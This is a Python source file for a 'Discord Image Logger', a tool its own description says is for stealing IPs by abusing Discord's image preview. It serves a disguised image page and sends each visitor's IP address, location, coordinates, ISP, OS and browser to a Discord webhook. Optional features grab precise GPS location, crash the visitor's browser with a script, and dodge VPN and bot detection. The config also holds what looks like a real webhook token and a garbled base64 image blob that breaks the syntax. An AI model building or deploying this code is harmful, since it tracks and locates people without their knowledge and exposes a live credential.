# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook":https://discord.com/api/webhooks/1128385755992047797/obgJMSs8FDlepBUl-u20TYCu5l95FZ6uuZ5gy5IlK0U8IaRLPt2yvzvOJt3VOAAHFj1g "https://discord.com/api/webhooks/your/webhook",
    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username":data:image/jpeg;base64,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 "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
